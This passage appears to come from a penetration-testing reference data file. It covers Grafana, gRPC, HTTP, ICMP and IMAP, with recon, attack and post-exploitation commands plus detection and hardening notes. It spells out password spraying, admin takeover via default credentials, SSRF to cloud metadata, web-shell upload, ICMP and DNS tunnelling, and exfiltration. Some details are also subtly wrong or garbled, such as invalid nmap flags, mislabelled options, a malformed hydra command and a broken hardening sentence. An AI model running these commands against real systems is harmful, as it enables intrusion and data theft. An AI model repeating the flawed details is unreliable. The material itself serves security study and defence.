        detail:
          "With admin rights you can set any user's password, including other administrators. That gives persistent access even after the original credential is rotated.",
        detection:
          "Password change events in the Grafana audit log, with the acting user and the target user recorded.",
        fix:
          "Require SSO, disable local user management, and send audit logs to a destination the Grafana instance cannot modify.",
      },
      {
        title: "Read datasource connection details",
        severity: "high",
        command: "curl -s -u admin:admin http://<target>:3000/api/datasources | jq '.[] | {name, type, url, user, database}'",
        detail:
          "Connection URLs, usernames and database names are returned in clear text, and the URLs alone describe the internal architecture in detail.",
        detection:
          "Datasources list requests from accounts that do not author dashboards, and audit entries for datasource export.",
        fix:
          "Keep datasource credentials in Grafana's secret storage or an external manager, and restrict the datasources API to administrators.",
      },
      {
        title: "Mint a long-lived API key",
        severity: "high",
        command:
          "curl -s -X POST 'http://<target>:3000/api/auth/keys' -u admin:admin -H 'Content-Type: application/json' -d '{\"name\":\"audit-key\",\"role\":\"Admin\",\"secondsToLive\":0}'",
        detail:
          "An API key with no expiry keeps working after passwords are changed, which is exactly what you want for persistence and exactly what an attacker wants.",
        detection:
          "API key creation events in the audit log, and keys that outlive the account that created them.",
        fix:
          "Set a lifetime on service account keys, label them clearly, and revoke keys that no longer have an owner.",
      },
    ],
    commands: [
      { command: "curl -s http://<target>:3000/api/health", description: "Returns version, commit and database status." },
      { command: "curl -s -u admin:admin http://<target>:3000/api/org", description: "Tests the default credentials." },
      { command: "curl -s -u admin:admin http://<target>:3000/api/users", description: "Lists users with their roles." },
      { command: "curl -s -u admin:admin http://<target>:3000/api/datasources", description: "Lists datasources and their connection details." },
      { command: "curl -s -u admin:admin 'http://<target>:3000/api/search?query='", description: "Searches dashboards and folders." },
      { command: "curl -s 'http://<target>:3000/api/datasources/proxy/uid/<uid>/http://169.254.169.254/'", description: "Sends a request through the datasource proxy to an arbitrary URL." },
      { command: "curl -s -X POST http://<target>:3000/api/auth/keys -u admin:admin -H 'Content-Type: application/json' -d '{\"name\":\"k\",\"role\":\"Admin\"}'", description: "Creates an API key with a role." },
      { command: "curl -s -X PUT http://<target>:3000/api/admin/users/<id>/password -u admin:admin -H 'Content-Type: application/json' -d '{\"password\":\"...\"}'", description: "Sets another user's password." },
      { command: "nmap -sV -p 3000 --script http-title,http-headers <target>", description: "Fingerprints the web service." },
      { command: "hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form '/login -u:^user^ -p:^pass^:F=incorrect' <target> -t 16", description: "Sprays the login form with a wordlist." },
    ],
    hardening: [
      {
        title: "Kill the default credentials",
        detail:
          "Change the admin password at first start and confirm the change is enforced. Enable anonymous access as disabled.",
      },
      {
        title: "Use SSO with MFA",
        detail:
          "Move human access to OIDC or LDAP with MFA, disable local password login, and keep group mapping in the identity provider.",
      },
      {
        title: "Restrict the datasource proxy",
        detail:
          "Put an egress proxy in front of Grafana that blocks link-local and internal ranges, and limit which roles can use the proxy at all.",
      },
      {
        title: "Store secrets properly",
        detail:
          "Use the secret store for datasource credentials rather than plaintext in configuration, and rotate anything that was committed to configuration files.",
      },
      {
        title: "Manage API keys",
        detail:
          "Set an expiry on every key, name it after the service that owns it, and run a monthly report of keys with no owner.",
      },
      {
        title: "Audit and isolate",
        detail:
          "Turn on the audit log, ship it elsewhere, and keep Grafana on a management interface rather than the public internet.",
      },
    ],
    tools: ["curl", "nmap", "hydra", "gobuster", "metasploit"],
  },
  {
    slug: "grpc",
    name: "gRPC",
    port: 50051,
    protocol: "tcp",
    risk: "high",
    tags: ["rpc", "protobuf", "api", "microservices"],
    summary:
      "gRPC runs a binary RPC framework over HTTP/2, and the wire format is unfamiliar enough that many teams forget it is an API surface. The transport is usually plaintext and the authorisation is usually left to the application, so a method that assumes it is only reachable from inside the mesh is often reachable from anywhere. Server reflection, when enabled, publishes the full method list and message definitions to the network. It is also a useful pivot, because a service that trusts its callers will happily fetch a URL on your behalf.",
    connect: [
      {
        label: "grpcurl",
        command: "grpcurl -plaintext <target>:50051 list",
        detail:
          "Lists the services and methods. It needs server reflection to be enabled, and where it is enabled it hands over the whole schema.",
      },
      {
        label: "HTTP/2 probe",
        command: "curl -s -o /dev/null -w '%{http_version} %{content_type}\\n' --http2-prior-knowledge http://<target>:50051/",
        detail:
          "A gRPC server answers an ordinary HTTP/2 request with a 415 and a gRPC content type, which identifies the service without any client library.",
      },
      {
        label: "TLS inspection",
        command: "openssl s_client -connect <target>:50051 -alpn h2 -servername <target> </dev/null",
        detail:
          "Shows whether TLS is in use, which ALPN protocols are offered and what the certificate says about the internal hostnames.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 50051 --script ssl-cert <target>",
        detail:
          "The certificate subject alternative names often name every service behind the load balancer, which is a good starting point for the internal map.",
      },
      {
        title: "ALPN and protocol check",
        command: "openssl s_client -connect <target>:50051 -alpn h2 </dev/null | grep -E 'ALPN|Protocol|Cipher'",
        detail:
          "Confirms whether the listener speaks h2 over TLS and which protocol version is negotiated. A plaintext listener will not complete the handshake at all.",
      },
      {
        title: "Response fingerprint",
        command: "curl -s -D - --http2-prior-knowledge http://<target>:50051/ -o /dev/null",
        detail:
          "The response headers include the content type and the gRPC status in the trailers, which confirms what you are talking to.",
      },
    ],
    enumeration: [
      {
        title: "Service list via reflection",
        command: "grpcurl -plaintext <target>:50051 list",
        detail:
          "Every service and method name in one call. Method names frequently reveal sensitive operations such as RotateCredentials or ExportBundle.",
      },
      {
        title: "Method and message definitions",
        command: "grpcurl -plaintext <target>:50051 describe <package>.<Service>",
        detail:
          "Describes the request and response message fields. Field names give you the shape of the data and often the validation rules.",
      },
      {
        title: "Save the schema locally",
        command: "grpcurl -plaintext -protoset <file>.protoset <target>:50051 list",
        detail:
          "Writing the descriptor set to disk lets you build a client offline and replay the same calls later without touching the network.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated method invocation",
        severity: "high",
        command:
          "grpcurl -plaintext -d '{\"username\":\"<user>\",\"password\":\"<password>\"}' <target>:50051 <package>.<Service>/Login",
        detail:
          "gRPC has no built-in authentication or authorisation. If the application does not check a token in an interceptor, any method that the network allows can be called by anyone.",
        detection:
          "Calls to methods that the client should never make, and requests arriving without the expected metadata headers.",
        fix:
          "Implement authentication and authorisation in a server interceptor that applies to every method, and fail closed when the metadata is missing.",
      },
      {
        title: "Server reflection exposure",
        severity: "medium",
        command: "grpcurl -plaintext <target>:50051 list",
        detail:
          "Reflection removes the need for a local copy of the protobuf definitions. It turns the service into a self-describing API that anyone can map.",
        detection:
          "Reflection requests from addresses that are not part of the service mesh, and any request to the reflection service in the access logs.",
        fix:
          "Do not register the reflection service in production builds, or restrict it with an interceptor to known clients.",
      },
      {
        title: "Interception of cleartext traffic",
        severity: "medium",
        command: "sudo tshark -i eth0 -Y 'http2.header.path' -T fields -e http2.header.path -e http2.header.authority",
        detail:
          "Plaintext gRPC is readable on the wire. The path header gives the exact method being called, and any string fields in the body are in the clear too.",
        detection:
          "Network monitoring for gRPC traffic outside the mesh, and certificate pinning failures on clients that expect TLS.",
        fix:
          "Require TLS for every gRPC listener, and use mutual TLS where the service mesh does not already provide it.",
      },
    ],
    postEx: [
      {
        title: "Call a privileged mutating method",
        severity: "high",
        command:
          "grpcurl -plaintext -d '{\"userId\":\"<id>\",\"role\":\"admin\"}' <target>:50051 <package>.<Service>/UpdateRole",
        detail:
          "Once the schema is known, the interesting methods are a single call away. Authorisation implemented in the UI rather than the service does not help here.",
        detection:
          "Method invocations that change state from a client identity that has never called that method before.",
        fix:
          "Authorise on the server for every method and log the caller identity with the method name and the argument identifiers.",
      },
      {
        title: "Use a service as a fetch proxy",
        severity: "high",
        command:
          "grpcurl -plaintext -d '{\"url\":\"http://169.254.169.254/latest/meta-data/\"}' <target>:50051 <package>.<Service>/Fetch",
        detail:
          "Methods that take a URL and return its contents will fetch internal addresses on request. Many of them exist for legitimate reasons and are reachable from outside.",
        detection:
          "Requests whose URL argument points at link-local or private ranges, and responses that look like cloud metadata documents.",
        fix:
          "Validate and restrict URLs server side against an allowlist, and block metadata addresses at the network egress.",
      },
      {
        title: "Replay and fuzz the discovered methods",
        severity: "medium",
        command:
          "grpcurl -plaintext -d '{\"id\":1}' <target>:50051 <package>.<Service>/Get -H 'authorization: Bearer <token>'",
        detail:
          "With the descriptor saved and a valid token in hand you can script calls across every method. That turns a manual exercise into a repeatable check and often exposes the authorisation gaps.",
        detection:
          "High-volume calls across many methods from one client, and repeated failures on methods with different authorisation contexts.",
        fix:
          "Apply rate limiting per identity, and give each client a token scoped to the methods it is meant to call.",
      },
    ],
    commands: [
      { command: "grpcurl -plaintext <target>:50051 list", description: "Lists services using server reflection." },
      { command: "grpcurl -plaintext <target>:50051 describe <package>.<Service>", description: "Describes a service and its message types." },
      { command: "grpcurl -plaintext -d '{...}' <target>:50051 <package>.<Service>/<Method>", description: "Invokes a method with a JSON message." },
      { command: "grpcurl -plaintext -protoset <file>.protoset <target>:50051 list", description: "Saves the reflection descriptor to a file." },
      { command: "grpcurl -plaintext -H 'authorization: Bearer <token>' <target>:50051 list", description: "Calls with metadata attached." },
      { command: "grpcurl -plaintext -max-time 10 -d '{\"id\":1}' <target>:50051 <package>.<Service>/Get", description: "Calls a method with a timeout." },
      { command: "curl -s -o /dev/null -w '%{http_version}\\n' --http2-prior-knowledge http://<target>:50051/", description: "Probes the listener over HTTP/2 without prior knowledge of gRPC." },
      { command: "openssl s_client -connect <target>:50051 -alpn h2 </dev/null", description: "Checks the TLS configuration and the certificate." },
      { command: "sudo tshark -i eth0 -Y 'http2.header.path' -T fields -e http2.header.path", description: "Reads method paths from captured traffic." },
      { command: "nmap -sV -p 50051 --script ssl-cert <target>", description: "Retrieves the certificate subject alternative names." },
    ],
    hardening: [
      {
        title: "Require TLS, ideally mutual TLS",
        detail:
          "Terminate TLS on every listener and validate client certificates where the architecture supports it, so an unknown host cannot open a session.",
      },
      {
        title: "Disable reflection in production",
        detail:
          "Do not register the reflection service in production builds. It costs nothing to leave out and removes a free schema export.",
      },
      {
        title: "Authorise in an interceptor",
        detail:
          "Put authentication and per-method authorisation in a server interceptor that applies to every method, and deny by default when the metadata is missing.",
      },
      {
        title: "Bound the resources",
        detail:
          "Set maximum message sizes, request deadlines and rate limits, so a large message or a tight loop cannot exhaust the node.",
      },
      {
        title: "Separate administrative methods",
        detail:
          "Run administrative operations on their own listener with a stricter policy, rather than hiding them behind a method name.",
      },
      {
        title: "Log with the caller identity",
        detail:
          "Record the method, the caller identity and the correlation id, and alert on new callers or unusual call volumes.",
      },
    ],
    tools: ["grpcurl", "nmap", "netcat", "openssl", "curl"],
  },
  {
    slug: "http",
    name: "HTTP/HTTPS",
    port: 80,
    protocol: "tcp",
    risk: "medium",
    tags: ["web", "tls", "reverse-proxy", "recon"],
    summary:
      "The web service is the one place where almost every other issue becomes reachable. Headers reveal the stack, the TLS configuration decides how much of the traffic anyone on the path can read, and exposed admin pages and backup files turn a web server into a file share. Modern applications also trust a surprising amount of input, from the Host header to the URL of a fetch call. Most findings here are configuration defects rather than exploits, which is exactly why they survive so long.",
    connect: [
      {
        label: "Header request",
        command: "curl -sI http://<target>:80/",
        detail:
          "The response headers name the server, the framework and any reverse proxy in front of it. This is the cheapest fingerprint available.",
      },
      {
        label: "TLS check",
        command: "openssl s_client -connect <target>:443 -servername <target> </dev/null",
        detail:
          "Shows the negotiated protocol, the cipher and the certificate chain. It is the fastest way to spot an expired certificate or a missing intermediate.",
      },
      {
        label: "Protocol check",
        command: "curl -s -o /dev/null -w '%{http_version} %{ssl_verify_result}\\n' https://<target>/",
        detail:
          "Reports the HTTP version and whether the certificate verified. A verification error here is a finding in its own right.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 80,443 --script http-title,http-headers,http-methods,ssl-cert <target>",
        detail:
          "One scan gives the title, the headers, the allowed methods and the certificate. It is a good default first move against a web target.",
      },
      {
        title: "Technology fingerprint",
        command: "whatweb -a 3 http://<target>",
        detail:
          "Identifies the web server, the CMS, the analytics and the JavaScript libraries in use, which narrows the search considerably.",
      },
      {
        title: "TLS configuration",
        command: "testssl.sh --full https://<target>",
        detail:
          "A thorough protocol and cipher review. It is slow, so run it on one host at a time rather than across a range.",
      },
    ],
    enumeration: [
      {
        title: "Content discovery",
        command: "ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404",
        detail:
          "Finds hidden paths and files. Keep the rate moderate and remember that a lot of this traffic ends up in the application logs.",
      },
      {
        title: "Discovery with extensions",
        command: "gobuster dir -u http://<target> -w /usr/share/wordlists/common.txt -x php,bak,txt",
        detail:
          "Adding extensions catches the backups that make up a large share of real breaches, such as site.php.bak or .env.",
      },
      {
        title: "Published files",
        command: "curl -s http://<target>/robots.txt && curl -s http://<target>/sitemap.xml | head -40",
        detail:
          "Both files describe parts of the application the owner did not intend to advertise, and both are routinely left in place after a redesign.",
      },
    ],
    attacks: [
      {
        title: "Information disclosure through the web root",
        severity: "high",
        command: "curl -s http://<target>/.git/config && curl -sI http://<target>/backup.zip",
        detail:
          "Version control directories, database dumps and configuration archives left under the document root give away source code and credentials without any exploitation at all.",
        detection:
          "Requests for .git, .svn, .env and common archive names in the access log. Any 200 response for those paths is worth investigating immediately.",
        fix:
          "Exclude these paths at the web server, keep them out of the deployment artifact, and run a check for stray files as part of the release pipeline.",
      },
      {
        title: "Weak TLS and missing security headers",
        severity: "medium",
        command: "nmap -p 443 --script ssl-enum-ciphers,ssl-cert <target>",
        detail:
          "Old protocol versions, weak ciphers, expired certificates and missing headers such as HSTS and CSP are all common and all easy to fix.",
        detection:
          "The scan output itself. These are configuration weaknesses rather than events, so they belong in a periodic baseline check.",
        fix:
          "Allow only TLS 1.2 and 1.3 with modern cipher suites, serve a valid chain from an automated certificate process, and set CSP, HSTS, X-Content-Type-Options and frame protections.",
      },
      {
        title: "Host header injection",
        severity: "medium",
        command: "curl -s -H 'Host: example.invalid' http://<target>/",
        detail:
          "When the application builds absolute URLs from the Host header, password reset mails and cache entries can be pointed at a host you control.",
        detection:
          "Responses that contain a request header value, and cache entries that vary by an unexpected host name.",
        fix:
          "Configure an explicit list of allowed hosts, and make sure the reverse proxy overwrites rather than passes through the client Host header.",
      },
    ],
    postEx: [
      {
        title: "Recover the source from an exposed repository",
        severity: "critical",
        command: "git-dumper http://<target>/.git /tmp/leaked",
        detail:
          "A .git directory gives you the whole source tree and its history. Database credentials and API keys that were committed and then removed are still in the objects.",
        detection:
          "Requests for .git objects in the access log, and any download of the packfile.",
        fix:
          "Block the path at the server, remove the directory from the artifact, and rotate anything that was ever committed.",
      },
      {
        title: "Upload through a file endpoint",
        severity: "critical",
        command: "curl -s -X POST -F 'file=@shell.php' http://<target>/upload.php",
        detail:
          "An upload that lands in a served directory without validation is remote code execution. It is the most common path to a foothold on a web application.",
        detection:
          "New files appearing in the upload directory, and requests with executable or unexpected content types.",
        fix:
          "Store uploads outside the document root with random names, validate the content type and extension, and never let the server execute uploaded files.",
      },
      {
        title: "Reach internal services through a fetch parameter",
        severity: "high",
        command: "curl -s 'http://<target>/fetch?url=http://169.254.169.254/latest/meta-data/'",
        detail:
          "Any parameter that takes a URL and returns the result is a server-side request forgery. It reaches internal services and cloud metadata from inside the network.",
        detection:
          "Requests whose URL parameter points at link-local or private address ranges, and outbound connections from the web server to unusual destinations.",
        fix:
          "Allowlist the destinations the fetch feature can use, block metadata addresses at egress, and validate the resolved address rather than the URL string.",
      },
    ],
    commands: [
      { command: "curl -sI http://<target>/", description: "Prints the response headers." },
      { command: "curl -sk -o /dev/null -w '%{http_code} %{ssl_verify_result}\\n' https://<target>/", description: "Checks the status code and certificate verification." },
      { command: "openssl s_client -connect <target>:443 -servername <target> </dev/null", description: "Inspects the TLS handshake and certificate." },
      { command: "testssl.sh --full https://<target>", description: "Runs a full TLS configuration review." },
      { command: "nikto -h http://<target>", description: "Runs the web server vulnerability scanner." },
      { command: "ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404", description: "Discovers hidden paths." },
      { command: "gobuster dir -u http://<target> -w /usr/share/wordlists/common.txt -x php,bak", description: "Discovers paths with common extensions." },
      { command: "whatweb -a 3 http://<target>", description: "Fingerprints the technologies in use." },
      { command: "curl -s http://<target>/robots.txt", description: "Reads the robots file." },
      { command: "nmap -p 80,443 --script http-title,http-headers,ssl-cert <target>", description: "Combines the common web checks in one scan." },
    ],
    hardening: [
      {
        title: "Redirect to HTTPS and pin it",
        detail:
          "Redirect plain HTTP to HTTPS, enable HSTS with a long max-age once you are confident every client supports it, and monitor for the first requests to mixed content.",
      },
      {
        title: "Modernise the TLS configuration",
        detail:
          "Allow only TLS 1.2 and 1.3, use a current cipher list, and automate certificate issuance so nothing runs on an expired certificate.",
      },
      {
        title: "Set the security headers",
        detail:
          "Add CSP, X-Content-Type-Options, frame protection, Referrer-Policy and Permissions-Policy. They are cheap and they remove whole classes of injection impact.",
      },
      {
        title: "Keep the document root clean",
        detail:
          "Block .git, .env, backup archives and configuration files at the server, and make the deployment pipeline fail if any of them appear.",
      },
      {
        title: "Protect the admin surface",
        detail:
          "Move admin paths behind VPN or SSO, change the default credentials, and require MFA on anything that can change state.",
      },
      {
        title: "Limit what the server can reach",
        detail:
          "Egress filter the application servers so a server-side request forgery cannot reach metadata or internal services, and put the origin behind a proxy that the internet cannot address.",
      },
    ],
    tools: ["curl", "nmap", "nikto", "ffuf", "gobuster", "openssl"],
  },
  {
    slug: "icmp",
    name: "ICMP",
    port: 0,
    protocol: "icmp",
    risk: "medium",
    tags: ["icmp", "network", "tunneling", "recon"],
    summary:
      "ICMP rides directly on IP and has no port numbers, so the port field here is zero to say exactly that. It is the protocol every host answers, which makes it the cheapest way to map a network and the easiest way to move data quietly. Egress filters routinely allow ping, so a full tunnel can be carried in echo requests without touching any other port. The time to live in the reply also gives away the operating system at a glance.",
    connect: [
      {
        label: "Ping",
        command: "ping -c 3 <target>",
        detail:
          "Three echo requests are enough to prove the host is up and to read the time to live value from the reply.",
      },
      {
        label: "Raw protocol check",
        command: "hping3 --icmp -c 3 <target>",
        detail:
          "Crafts the ICMP packet by hand, which lets you change the type, the code and the payload for testing how a network treats each one.",
      },
      {
        label: "Capture",
        command: "sudo tcpdump -n -i eth0 'icmp'",
        detail:
          "Watches the ICMP traffic on the segment. On a shared network this shows which hosts are scanning and how their probes look.",
      },
    ],
    recon: [
      {
        title: "Host discovery sweep",
        command: "nmap -sn -IC <target>/24",
        detail:
          "Sends an ICMP echo request to every address in the range. It is fast, quiet enough, and it misses hosts that block ping, so pair it with a TCP sweep.",
      },
      {
        title: "Route discovery",
        command: "traceroute -n -w 1 <target>",
        detail:
          "Uses increasing time to live values to find the hops between you and the target. The addresses in between are usually less well documented than the target itself.",
      },
      {
        title: "Segment survey",
        command: "sudo tcpdump -n -i eth0 'icmp[icmptype] = icmp-echo' -c 50",
        detail:
          "Captures the echo traffic on the segment and reveals the scanning activity of other people, which is useful context for your own assessment.",
      },
    ],
    enumeration: [
      {
        title: "Operating system fingerprint from the TTL",
        command: "ping -c 1 <target> | grep -o 'ttl=[0-9]*'",
        detail:
          "A reply time to live of 64 points to Linux, 128 to Windows and 255 to a network device. It is a first guess, not a conclusion.",
      },
      {
        title: "ICMP options in the reply",
        command: "sudo tcpdump -n -vv -i eth0 'icmp[icmptype] = icmp-echo-reply'",
        detail:
          "The verbose decode shows the timestamp and address mask options, which are present on some stacks and absent on others.",
      },
      {
        title: "Hop by hop with crafted probes",
        command: "hping3 --icmp --traceroute -c 5 <target>",
        detail:
          "Walks the path while letting you control the ICMP payload and type, which is useful when a middlebox is mangling the packets.",
      },
    ],
    attacks: [
      {
        title: "ICMP tunnelling to bypass egress filtering",
        severity: "high",
        command:
          "ptunnel -l 8000 -r 127.0.0.1:9000 -u /tmp/icmp.key -p /tmp/pinger.pid <target>",
        detail:
          "The tool carries TCP traffic inside echo requests and replies. Egress rules that allow ping but block everything else now carry your traffic instead, and it looks like ordinary pings on the wire.",
        detection:
          "ICMP echo traffic with an unusual payload length or content, a mismatch between the request and reply identifiers, and traffic volume far above what a ping sweep would produce.",
        fix:
          "Filter ICMP by type and destination at the perimeter, and only allow echo request and reply towards the addresses that need them.",
      },
      {
        title: "DNS tunnelling for command and control",
        severity: "high",
        command: "python3 dnscat2-server.py --dns server=<ip>",
        detail:
          "Data is encoded into DNS query names for a domain you control. Because DNS is almost always permitted, the channel works through networks that block every other protocol.",
        detection:
          "Long and high-entropy subdomain labels, a single domain queried at a high rate, and DNS traffic to resolvers outside the approved list.",
        fix:
          "Force DNS through the corporate resolver, block direct external DNS, and alert on the query patterns that tunnels produce.",
      },
      {
        title: "Spoofed source address for reflection",
        severity: "medium",
        command: "hping3 --icmp -c 3 --spoof <source-ip> <target>",
        detail:
          "Requests sent with a source address that is not yours make the target reply to someone else. That is the basis of reflection attacks, and against an open resolver it becomes a denial of service.",
        detection:
          "A spike in echo requests with a source address that does not match the segment, and traffic arriving from unexpected source addresses.",
        fix:
          "Enable ingress filtering on the border router so packets with spoofed sources never leave the network.",
      },
    ],
    postEx: [
      {
        title: "Move traffic through an established tunnel",
        severity: "high",
        command: "socat TCP-LISTEN:8000,reuseaddr,fork TCP:127.0.0.1:9000",
        detail:
          "The tunnel carries a TCP stream inside ICMP, and a local listener gives your tooling something to talk to. This is how a tunnelled path becomes a usable proxy.",
        detection:
          "Local listeners that do not correspond to a running service, and long-lived sessions on the tunnelling host.",
        fix:
          "Block the tunnel protocol at the perimeter and alert on ICMP payloads that do not match the pattern of a normal ping.",
      },
      {
        title: "Exfiltrate data in small ICMP chunks",
        severity: "medium",
        command: "hping3 --icmp -c 1 -d 64 --data 0x48656c6c6f <target>",
        detail:
          "The payload field carries arbitrary bytes. Splitting a file into small pieces and sending them one at a time is slow but slips through filters that inspect other protocols.",
        detection:
          "Echo requests with a consistent payload length and content, and a one-to-one correspondence between request and reply.",
        fix:
          "Drop ICMP echo request packets that exceed the size of a standard ping, and inspect the payload content on the border.",
      },
      {
        title: "Reach a management interface that filters TCP",
        severity: "medium",
        command: "traceroute -n -w 1 -q 1 <target>",
        detail:
          "Sometimes the only path to a device is through a filter that permits ICMP. Establishing a tunnel and using it to reach the management interface turns a filtered host into a reachable one.",
        detection:
          "Tunnel traffic followed by management protocol traffic from the same host, which is a strong pattern to alert on.",
        fix:
          "Keep management interfaces on a dedicated network reachable only through a jump host, and do not rely on ping reachability as evidence of connectivity.",
      },
    ],
    commands: [
      { command: "ping -c 3 <target>", description: "Sends echo requests and prints the replies." },
      { command: "ping -c 1 <target> | grep ttl", description: "Reads the time to live from the reply." },
      { command: "traceroute -n <target>", description: "Finds the hops to the target without DNS lookups." },
      { command: "hping3 --icmp -c 3 <target>", description: "Sends a crafted ICMP packet." },
      { command: "hping3 --icmp --traceroute -c 5 <target>", description: "Walks the path with crafted ICMP probes." },
      { command: "nmap -sn -IC <target>/24", description: "Discovers hosts using ICMP echo requests." },
      { command: "nmap -sn -PE <target>/24", description: "Discovers hosts using a TCP SYN probe." },
      { command: "sudo tcpdump -n -i eth0 'icmp'", description: "Captures ICMP traffic on the interface." },
      { command: "sudo tcpdump -n -vv -i eth0 'icmp[icmptype] = icmp-echo'", description: "Decodes echo requests with full detail." },
      { command: "hping3 --icmp -c 3 --spoof <source-ip> <target>", description: "Sends ICMP with a spoofed source address." },
    ],
    hardening: [
      {
        title: "Filter ICMP by type",
        detail:
          "At the perimeter, allow only echo request and reply and drop redirects, information requests, time exceeded and everything else that is not needed.",
      },
      {
        title: "Ignore or drop redirects",
        detail:
          "Disable ICMP redirect acceptance and sending on all hosts and routers, since a redirect is a request to change your routing table.",
      },
      {
        title: "Enable ingress filtering",
        detail:
          "Configure reverse path filtering and border router source address validation so packets with a spoofed source never leave your network.",
      },
      {
        title: "Rate limit responses",
        detail:
          "Apply the guidance that a gateway should answer at most one echo per second per source, which throttles reflection abuse.",
      },
      {
        title: "Watch for tunnel patterns",
        detail:
          "Alert on echo traffic with a constant unusual payload length, on high entropy payloads, and on mismatched request and reply identifiers.",
      },
      {
        title: "Segment management networks",
        detail:
          "Do not rely on ICMP reachability as proof that a host is reachable for management, and keep management protocols on networks that do not need ping.",
      },
    ],
    tools: ["nmap", "ping", "hping3", "tcpdump", "traceroute", "wireshark"],
  },
  {
    slug: "imap",
    name: "IMAP",
    port: 143,
    protocol: "tcp",
    risk: "medium",
    tags: ["mail", "authentication", "cleartext", "ldap"],
    summary:
      "IMAP keeps the mailbox on the server, so the session stays open and every action is a command in the clear on port 143. The STARTTLS and implicit TLS variants fix that, but plenty of installations still accept a plaintext login. Servers rarely lock accounts, so password spraying against IMAP is effective and quiet. Once inside a mailbox, the messages themselves become a target, because people forward credentials and internal details through email without thinking about it.",
    connect: [
      {
        label: "TLS on 993",
        command: "openssl s_client -connect <target>:993 -quiet",
        detail:
          "Opens the implicit TLS port. Once the session is up you can type IMAP commands directly and see every response.",
      },
      {
        label: "STARTTLS upgrade",
        command: "openssl s_client -connect <target>:143 -starttls imap -quiet",
        detail:
          "Upgrades a plain connection to TLS on the standard port. The server must advertise STARTTLS in its capability list first.",
      },
      {
        label: "curl",
        command: "curl -s imaps://<target>:993/INBOX --user '<user>:<password>'",
        detail:
          "The curl IMAP support handles the login and the mailbox selection for you, which makes scripted collection easy.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 143,993 --script imap-capabilities,ssl-cert <target>",
        detail:
          "The capabilities script reports the authentication mechanisms, the namespace support and the maximum command length. That tells you whether STARTTLS is offered.",
      },
      {
        title: "Plaintext capability probe",
        command: "printf 'a1 CAPABILITY\\r\\n' | nc -nv <target> 143",
        detail:
          "CAPABILITY is valid before authentication, so it works as a banner grab and shows the login mechanisms the server accepts.",
      },
      {
        title: "Login surface",
        command: "printf 'a1 LOGIN <user> <password>\\r\\na2 LOGOUT\\r\\n' | nc -nv <target> 143",
        detail:
          "Sending the commands by hand shows the exact failure strings, which is what user enumeration compares against.",
      },
    ],
    enumeration: [
      {
        title: "List mailboxes",
        command: "curl -s -X 'LIST \"\" \"*\"' imap://<target>:143/ --user '<user>:<password>'",
        detail:
          "Every shared mailbox, team folder and archive appears here. The naming convention tells you how the organisation works.",
      },
      {
        title: "Inbox counters",
        command: "curl -s -X 'STATUS INBOX (MESSAGES UNSEEN RECENT)' imap://<target>:143/ --user '<user>:<password>'",
        detail:
          "A quick size and activity read on a mailbox, useful for deciding whether the account is worth pursuing further.",
      },
      {
        title: "Existing session state",
        command: "curl -s -X 'LIST \"\" \"*\"' imaps://<target>:993/ --user '<user>:<password>'",
        detail:
          "Repeating the enumeration over TLS confirms the same view without the credential ever crossing the network in the clear.",
      },
    ],
    attacks: [
      {
        title: "Credential capture on the plaintext listener",
        severity: "high",
        command: "sudo tshark -i eth0 -Y 'imap.command' -T fields -e imap.command",
        detail:
          "The LOGIN command carries the username and the password as plain text arguments. On a shared segment that is the whole attack.",
        detection:
          "Plaintext IMAP logins seen on the network. Server side, any login from an address that normally uses port 993 is worth reviewing.",
        fix:
          "Disable the plaintext LOGIN command, require STARTTLS before authentication, and move clients to implicit TLS on 993.",
      },
      {
        title: "Password spraying against IMAP",
        severity: "high",
        command: "hydra -l <user> -P /usr/share/wordlists/rockyou.txt imap://<target> -t 16",
        detail:
          "Mail servers rarely lock accounts, and a slow spray against a list of common passwords across many accounts is hard to distinguish from noise.",
        detection:
          "Failed logins spread across many accounts from one source, and successful logins for accounts that are rarely used.",
        fix:
          "Enforce lockout or exponential backoff, block the source at the perimeter, and require MFA or app-specific passwords for webmail access.",
      },
      {
        title: "Account enumeration through error differences",
        severity: "medium",
        command: "nmap --script imap-brute -p 143 <target>",
        detail:
          "The responses for an unknown user and a wrong password are not always identical. Any difference is enough to build a list of valid accounts.",
        detection:
          "Enumeration attempts show up as a high proportion of invalid users with a consistent failure string.",
        fix:
          "Return the same message and the same response time for every authentication failure.",
      },
    ],
    postEx: [
      {
        title: "Read messages from the mailbox",
        severity: "high",
        command: "curl -s -X 'FETCH 1 (BODY[])' imap://<target>:143/INBOX/ --user '<user>:<password>'",
        detail:
          "Message bodies carry the interesting material: shared links, internal URLs, supplier contacts and the occasional credential somebody pasted into a ticket.",
        detection:
          "Large volumes of FETCH commands against one mailbox, and access from an address that is not the user's usual client.",
        fix:
          "Give each person their own account, review access logs for bulk retrieval, and use data loss prevention on the mail path.",
      },
      {
        title: "Enumerate and read shared mailboxes",
        severity: "high",
        command: "curl -s -X 'LIST \"\" \"*\"' imap://<target>:143/ --user '<user>:<password>'",
        detail:
          "Team, project and archive mailboxes are often readable by many accounts, and they hold a far better picture of the business than an individual's inbox.",
        detection:
          "SELECT and FETCH operations on mailboxes that the account does not normally open, with a pattern of listing followed by bulk reads.",
        fix:
          "Apply per-mailbox ACLs, remove stale shared access, and review group mailbox membership regularly.",
      },
      {
        title: "Harvest internal contacts and hostnames",
        severity: "medium",
        command: "curl -s -X 'FETCH 1 (BODY[HEADER])' imap://<target>:143/INBOX/ --user '<user>:<password>'",
        detail:
          "Message headers expose internal mail domains, partner systems and the names of people in departments you have not touched yet. It is a good target list for the next phase.",
        detection:
          "Sequential header fetches across many messages, which looks different from a client reading one message at a time.",
        fix:
          "Limit bulk access to the mail store, and treat address book and mailbox contents as data you would notice being exported.",
      },
    ],
    commands: [
      { command: "a1 CAPABILITY", description: "Lists the mechanisms and extensions the server supports." },
      { command: "a2 LOGIN <user> <password>", description: "Authenticates. Sent in clear text without TLS." },
      { command: "a3 LIST \"\" \"*\"", description: "Lists every mailbox the session can see." },
      { command: "a4 STATUS INBOX (MESSAGES UNSEEN)", description: "Returns counters for a mailbox." },
      { command: "a5 SELECT INBOX", description: "Opens a mailbox for reading." },
